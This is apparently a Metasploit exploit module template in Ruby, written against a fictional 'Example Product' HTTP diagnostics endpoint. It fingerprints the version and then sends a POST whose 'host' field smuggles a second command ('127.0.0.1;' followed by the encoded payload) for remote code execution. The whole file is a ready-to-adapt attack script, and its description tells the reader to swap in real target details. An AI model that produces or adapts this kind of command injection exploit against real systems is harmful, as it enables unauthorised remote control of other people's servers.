class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Example Product Diagnostic Command Injection',
        'Description' => %q{
          This reference module demonstrates the structure of an HTTP command
          injection exploit. Replace the fictional target details with evidence
          from the vulnerability context.
        },
        'Author' => ['ZeroForge'],
        'References' => [['URL', 'https://example.invalid/advisory']],
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Targets' => [['Automatic', {}]],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2026-01-01'
      )
    )

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [true, 'Application base path', '/'])
      ]
    )
  end

  def check
    response = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'version')
    )
    return CheckCode::Unknown('Target did not respond') unless response
    return CheckCode::Safe unless response.code == 200
    return CheckCode::Appears if response.body.include?('Example Product 1.0')

    CheckCode::Detected
  end

  def exploit
    response = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api', 'diagnostics'),
      'vars_post' => { 'host' => "127.0.0.1;#{payload.encoded}" }
    )
    fail_with(Failure::Unreachable, 'Target did not respond') unless response
    unless response.code == 200
      fail_with(Failure::UnexpectedReply, "Unexpected HTTP #{response.code}")
    end
  end
end
